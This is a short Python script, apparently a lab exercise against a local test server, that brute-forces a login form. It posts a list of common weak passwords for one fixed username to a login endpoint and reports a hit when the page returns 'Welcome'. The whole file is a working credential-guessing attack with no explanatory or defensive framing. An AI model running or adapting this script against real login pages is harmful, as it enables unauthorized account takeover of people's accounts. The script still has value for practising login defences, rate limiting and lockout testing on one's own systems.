import requests

url = "http://127.0.0.1:5000/login"

username = "raport2@test.com"

passwords = ["123", "1234", "admin", "password", "qwerty", "test1234", "9999", "5555"]

for password in passwords:
    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, data=data)

    print(f"Trying: {password}")

    if "Welcome" in response.text:
        print(f"[+] Password found: {password}")
        break
